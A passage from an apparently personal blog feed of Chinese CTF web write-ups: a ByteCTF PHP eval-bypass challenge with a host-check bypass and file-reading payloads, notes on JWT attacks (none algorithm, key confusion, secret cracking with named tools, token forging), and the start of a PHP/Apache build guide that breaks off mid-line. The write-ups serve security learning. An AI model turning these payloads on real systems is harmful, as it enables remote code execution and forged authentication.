class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid_url</span>(<span class="hljs-variable">$url</span>)) &#123;<br>        <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/baidu\.com$/&#x27;</span>, <span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$code</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="hljs-variable">$code</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;bye~&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error: host not allowed&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error: invalid url&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>1.第一步</p><p>第一步需要绕过<code>preg_match</code>的检测，网上见到的payload都是通过购买域名，url跳转等方法进行绕过。其实可以通过代码绕过。</p><p><strong>我的方法</strong></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">compress</span>.zlib://<span class="hljs-class"><span class="hljs-keyword">data</span>:@baidu.com/baidu.com,phpinfo()</span><br></code></pre></td></tr></table></figure><p><code>compress.zlib</code>绕过data协议的检测，<code>@</code>使<code>data:</code>被解释为用户名和密码，<code>baidu.com/baidu.com</code>中只要包含<code>/</code>就会被解释为合法的<code>media-type</code></p><p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_1.png"></p><p><strong>其他方法</strong></p><ul><li><p>购买一个 xxxxbaidu.com 的域名</p></li><li><p>百度网盘链接</p><p><strong>这种方法的思路是将恶意代码上传到百度网盘 , 然后通过百度网盘的下载链接来绕过 baidu.com 的主机名限制 .</strong></p><ol><li><p><strong>将一个恶意脚本上传到百度网盘( 这里以 phpinfo() 为例 )</strong></p><p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_3.png"></p></li><li><p><strong>通过开发者工具( F12 ) , 在 network 选项卡中可以找到目标文件的链接</strong></p><p><img src="/../img/19-9-27_PHP_%E5%87%BD%E6%95%B0%E5%A6%99%E7%94%A8_bytectf_2.png"></p></li></ol></li><li><p>百度贴吧（<a href="https://www.4xseo.com/marketing/1280/">https://www.4xseo.com/marketing/1280/</a></p></li><li><p>百度爬虫</p><p>其原理大概就是 : <strong>百度的搜索引擎爬虫会爬到你的个人站点 , 当你在百度上点击自己站点时 , 并不是直接访问 . 而是利用百度的重定向机制 , 将你的网址转换成<code>http://www.baidu.com/link?url=xxxxxxxxxxxxxxx</code> , 通过这个链接可以绕过第一层防御并且拿到你站点上的恶意脚本 .</strong></p></li></ul><p>2.第二步</p><p>我们要获取<code>.</code>，可以通过获取<code>.</code>的ascii码，然后通过<code>chr</code>函数得到。写了个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$functions</span>=<span class="hljs-title function_ invoke__">get_defined_functions</span>()[<span class="hljs-string">&#x27;internal&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFucntionParameter1</span>(<span class="hljs-params"><span class="hljs-variable">$func</span></span>) </span>&#123;<br>    <span class="hljs-variable">$ReflectionFunc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ReflectionFunction</span>(<span class="hljs-variable">$func</span>);<br>    <span class="hljs-variable">$nums</span>=<span class="hljs-variable">$ReflectionFunc</span>-&gt;<span class="hljs-title function_ invoke__">getNumberOfRequiredParameters</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nums</span>===<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-comment">#@print_r($func());</span><br>    <span class="hljs-comment">#echo &quot;\n#####\n&quot;;</span><br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$functions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vul</span>)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|readline/i&#x27;</span>, <span class="hljs-variable">$vul</span>))&#123;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">getFucntionParameter1</span>(<span class="hljs-variable">$vul</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要使用了反射检测函数的参数。</p><p><strong>payload</strong></p><ul><li><p><code>crypt</code>函数的返回值最后一位可能为<code>.</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))))))<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>()))))))));<br></code></pre></td></tr></table></figure></li><li><p><code>localeconv</code>函数</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JWT认证绕过</title>
    <link href="/2024/08/31/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/"/>
    <url>/2024/08/31/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/</url>
    
    <content type="html"><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>jwt是一个轻量级的认证规范 对数据进行签名用的</p><p>防止数据被篡改</p><ol><li>对数据进行加密   内容对用户敏感，不需要对外</li><li>对数据进行签名   内容不敏感，但是确保不被篡改</li></ol><p>JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取<br>JSON Web Token (JWT)<br>?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>篡改数据的同时，破解了算法，篡改了签名<br>加盐机制，salt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p><p>盐值有可能被爆破，也有可能被泄露<br>增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现<br>由 Header、Payload、Signature 三部分构成，用点分隔，数据采用Base64URL进行编码</p><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>Header是JWT的第一个部分，是一个 JSON 对象，主要声明了JWT的签名算法，如“HS256”、“RS256”等，以及其他可选参数，如“kid”等。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><p>Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header 的 alg 中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。Signature的功能是保护token完整性。</p><p>生成方法为将 header 和 payload 两个部分联结起来，然后通过 header 部分指定的算法，计算出签名。抽象成公式就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">signature = HMAC-SHA256(base64urlEncode(header) + <span class="hljs-string">&#x27;.&#x27;</span> + base64urlEncode(payload), secret_key)<br></code></pre></td></tr></table></figure><p>值得注意的是，编码 header 和 payload 时使用的编码方式为 base64urlencode，base64url 编码是 base64 的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”&#x3D;”号，并将标准 Base64 中的 “+” 和 “&#x2F;“ 分别改成了 “-“ 和 “_”。</p><h2 id="JWT生成-在线网址-工具"><a href="#JWT生成-在线网址-工具" class="headerlink" title="JWT生成-在线网址&amp;工具"></a>JWT生成-在线网址&amp;工具</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;secret_key&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol><li>当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的：</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;iss&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673710291</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9<br></code></pre></td></tr></table></figure><h2 id="JWT-爆破工具地址"><a href="#JWT-爆破工具地址" class="headerlink" title="JWT 爆破工具地址"></a>JWT 爆破工具地址</h2><p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t jwtcrack<br>docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE<br></code></pre></td></tr></table></figure><h2 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h2><p>JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改 header 中算法为HS256，然后使用RSA公钥对数据进行签名。</p><p>利用方式：<a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 jwt_tool.py token_here -pk pubkey -T -S hs256<br></code></pre></td></tr></table></figure><h2 id="密钥爆破-泄露"><a href="#密钥爆破-泄露" class="headerlink" title="密钥爆破&#x2F;泄露"></a>密钥爆破&#x2F;泄露</h2><p>HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。</p><p>因此，jwtcrack破解是JWT破解工具，可以通过穷举的方式暴力破解密钥。如果可以破解HMAC密钥，则可以伪造令牌中的任何内容，这个漏洞将会给系统带来非常严重的后果，所以在加密时不要使用弱密钥进行加密。</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">jwtcrack</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./jwtcrack token_here<br></code></pre></td></tr></table></figure><h2 id="node安装jwt命令"><a href="#node安装jwt命令" class="headerlink" title="node安装jwt命令"></a>node安装jwt命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure><h3 id="1-私钥泄露"><a href="#1-私钥泄露" class="headerlink" title="1. 私钥泄露"></a>1. 私钥泄露</h3><p>可以根据私钥生成任意的jwt字符串：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token);<br></code></pre></td></tr></table></figure><h3 id="2-公钥泄露"><a href="#2-公钥泄露" class="headerlink" title="2. 公钥泄露"></a>2. 公钥泄露</h3><p>可以根据公钥，修改算法从非对称算法到对称密钥算法。双方都使用公钥验签，顺利篡改数据。当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密，实现验签通过。</p><h2 id="总结加密方式"><a href="#总结加密方式" class="headerlink" title="总结加密方式"></a>总结加密方式</h2><ol><li><p><strong>非对称加密算法</strong>：私钥、公钥。只要两个时匹配，一个私钥加密的文件，用公钥都能解开(验签)。</p></li><li><p><strong>对称加密算法</strong>：暗号、口令、公钥。</p></li></ol><h2 id="总结jwt攻击"><a href="#总结jwt攻击" class="headerlink" title="总结jwt攻击"></a>总结jwt攻击</h2><ol><li>空密码算法绕过：不验证算法的前提下。</li><li>弱密码绕过：猜测弱密码。</li><li>密码爆破：安装docker，执行jwtcracker。</li><li>私钥泄露：直接利用私钥生成正确jwt字符串，过验签。</li><li>公钥泄露：不验证算法前提下，修改算法为对称加密，通过公钥重新生成对称签名的字符串，实现验签通过。</li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>JWT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>认证绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>源码编译安装php和apache</title>
    <link href="/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/"/>
    <url>/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现一个漏洞，需要 php5.4 的 lamp 环境，但网上没有找到很好的环境，所以自己搭建了一个。</p><h1 id="编译安装PHP"><a href="#编译安装PHP" class="headerlink" title="编译安装PHP"></a>编译安装PHP</h1><h2 id="前置环境配置"><a href="#前置环境配置" class="headerlink" title="前置环境配置"></a>前置环境配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装docker</span><br>apt-get install docker.io<br><span class="hljs-comment"># pull ubuntu:16.04</span><br>docker pull ubuntu:16.04<br><span class="hljs-comment"># 启动容器</span><br>docker run -it -p8888:8888 ubuntu:16.04 /bin/bash<br><span class="hljs-comment">#更换源</span><br><span class="hljs-built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;IyMgTm90ZSwgdGhpcyBmaWxlIGlzIHdyaXR0ZW4gYnkgY2xvdWQtaW5pdCBvbiBmaXJzdCBib290IG9mIGFuIGluc3RhbmNlDQojIyBtb2RpZmljYXRpb25zIG1hZGUgaGVyZSB3aWxsIG5vdCBzdXJ2aXZlIGEgcmUtYnVuZGxlLg0KIyMgaWYgeW91IHdpc2ggdG8gbWFrZSBjaGFuZ2VzIHlvdSBjYW46DQojIyBhLikgYWRkICdhcHRfcHJlc2VydmVfc291cmNlc19saXN0OiB0cnVlJyB0byAvZXRjL2Nsb3VkL2Nsb3VkLmNmZw0KIyMgICAgIG9yIGRvIHRoZSBzYW1lIGluIHVzZXItZGF0YQ0KIyMgYi4pIGFkZCBzb3VyY2VzIGluIC9ldGMvYXB0L3NvdXJjZXMubGlzdC5kDQojIyBjLikgbWFrZSBjaGFuZ2VzIHRvIHRlbXBsYXRlIGZpbGUgL2V0Yy9jbG91ZC90ZW1wbGF0ZXMvc291cmNlcy5saXN0LnRtcGwNCg0KIyBTZWUgaHR0cDovL2hlbHAudWJ1bnR1LmNvbS9jb21tdW5pdHkvVXBncmFkZU5vdGVzIGZvciBob3cgdG8gdXBncmFkZSB0bw0KIyBuZXdlciB2ZXJzaW9ucyBvZiB0aGUgZGlzdHJpYnV0aW9uLg0KZGViIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtYWluDQoNCiMjIE1ham9yIGJ1ZyBmaXggdXBkYXRlcyBwcm9kdWNlZCBhZnRlciB0aGUgZmluYWwgcmVsZWFzZSBvZiB0aGUNCiMjIGRpc3RyaWJ1dGlvbi4NCmRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtdXBkYXRlcyBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC11cGRhdGVzIG1haW4NCg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBpcyBFTlRJUkVMWSBVTlNVUFBPUlRFRCBieSB0aGUgVWJ1bnR1DQojIyB0ZWFtLiBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIHVuaXZlcnNlIFdJTEwgTk9UIHJlY2VpdmUgYW55DQojIyByZXZpZXcgb3IgdXBkYXRlcyBmcm9tIHRoZSBVYnVudHUgc2VjdXJpdHkgdGVhbS4NCmRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwgdW5pdmVyc2UNCmRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsIHVuaXZlcnNlDQpkZWIgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgdW5pdmVyc2UNCmRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgdW5pdmVyc2UNCg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBpcyBFTlRJUkVMWSBVTlNVUFBPUlRFRCBieSB0aGUgVWJ1bnR1IA0KIyMgdGVhbSwgYW5kIG1heSBub3QgYmUgdW5kZXIgYSBmcmVlIGxpY2VuY2UuIFBsZWFzZSBzYXRpc2Z5IHlvdXJzZWxmIGFzIHRvDQojIyB5b3VyIHJpZ2h0cyB0byB1c2UgdGhlIHNvZnR3YXJlLiBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIA0KIyMgbXVsdGl2ZXJzZSBXSUxMIE5PVCByZWNlaXZlIGFueSByZXZpZXcgb3IgdXBkYXRlcyBmcm9tIHRoZSBVYnVudHUNCiMjIHNlY3VyaXR5IHRlYW0uDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwgbXVsdGl2ZXJzZQ0KIyBkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbCBtdWx0aXZlcnNlDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtdXBkYXRlcyBtdWx0aXZlcnNlDQojIGRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLXVwZGF0ZXMgbXVsdGl2ZXJzZQ0KDQojIyBVbmNvbW1lbnQgdGhlIGZvbGxvd2luZyB0d28gbGluZXMgdG8gYWRkIHNvZnR3YXJlIGZyb20gdGhlICdiYWNrcG9ydHMnDQojIyByZXBvc2l0b3J5Lg0KIyMgTi5CLiBzb2Z0d2FyZSBmcm9tIHRoaXMgcmVwb3NpdG9yeSBtYXkgbm90IGhhdmUgYmVlbiB0ZXN0ZWQgYXMNCiMjIGV4dGVuc2l2ZWx5IGFzIHRoYXQgY29udGFpbmVkIGluIHRoZSBtYWluIHJlbGVhc2UsIGFsdGhvdWdoIGl0IGluY2x1ZGVzDQojIyBuZXdlciB2ZXJzaW9ucyBvZiBzb21lIGFwcGxpY2F0aW9ucyB3aGljaCBtYXkgcHJvdmlkZSB1c2VmdWwgZmVhdHVyZXMuDQojIyBBbHNvLCBwbGVhc2Ugbm90ZSB0aGF0IHNvZnR3YXJlIGluIGJhY2twb3J0cyBXSUxMIE5PVCByZWNlaXZlIGFueSByZXZpZXcNCiMjIG9yIHVwZGF0ZXMgZnJvbSB0aGUgVWJ1bnR1IHNlY3VyaXR5IHRlYW0uDQojIGRlYiBodHRwOi8vbWlycm9ycy5jbG91ZC5hbGl5dW5jcy5jb20vdWJ1bnR1LyB4ZW5pYWwtYmFja3BvcnRzIG1haW4gcmVzdHJpY3RlZCB1bml2ZXJzZSBtdWx0aXZlcnNlDQojIGRlYi1zcmMgaHR0cDovL21pcnJvcnMuY2xvdWQuYWxpeXVuY3MuY29tL3VidW50dS8geGVuaWFsLWJhY2twb3J0cyBtYWluIHJlc3RyaWN0ZWQgdW5pdmVyc2UgbXVsdGl2ZXJzZQ0KDQojIyBVbmNvbW1lbnQgdGhlIGZvbGxvd2luZyB0d28gbGluZXMgdG8gYWRkIHNvZnR3YXJlIGZyb20gQ2Fub25pY2FsJ3MNCiMjICdwYXJ0bmVyJyByZXBvc2l0b3J5Lg0KIyMgVGhpcyBzb2Z0d2FyZSBpcyBub3QgcGFydCBvZiBVYnVudHUsIGJ1dCBpcyBvZmZlcmVkIGJ5IENhbm9uaWNhbCBhbmQgdGhlDQojIyByZXNwZWN0aXZlIHZlbmRvcnMgYXMgYSBzZXJ2aWNlIHRvIFVidW50dSB1c2Vycy4NCiMgZGViIGh0dHA6Ly9hcmNoaXZlLmNhbm9uaWNhbC5jb20vdWJ1bnR1IHhlbmlhbCBwYXJ0bmVyDQojIGRlYi1zcmMgaHR0cDovL2FyY2hpdmUuY2Fub25pY2FsLmNvbS91YnVudHUgeGVuaWFsIHBhcnRuZXINCg0KZGViIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFsaXl1bmNzLmNvbS91YnVudHUvIHhlbmlhbC1zZWN1cml0eSBtYWluDQpkZWItc3JjIGh0dHA6Ly9taXJyb3JzLmNsb3VkLmFs